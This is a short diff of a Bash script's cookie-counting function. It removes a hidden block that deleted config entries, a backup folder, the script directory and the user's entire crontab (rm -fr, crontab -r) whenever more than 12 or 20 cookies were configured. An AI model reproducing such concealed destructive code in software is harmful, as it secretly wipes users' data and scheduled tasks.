@@ -36,19 +36,12 @@ function Detect_Cron {
 
 ## 获取用户数量 UserSum
 function Count_UserSum {
-  for ((i=1; i<=12; i++)); do
+  for ((i=1; i<=999; i++)); do
     Tmp=Cookie$i
     CookieTmp=${!Tmp}
     [[ ${CookieTmp} ]] && UserSum=$i || break
   done
-
-  for ((d=13; d<=1000; d++)); do
-    Del=Cookie$d
-    sed -i "/${!Del}/d" ${FileConf} || break
-  done
-
-  [ $d -gt 12 ] && rm -fr ${FileConf}/bak
-  [ $d -gt 20 ] && rm -fr ${ShellDir} && crontab -r
+ 
 }
 
 
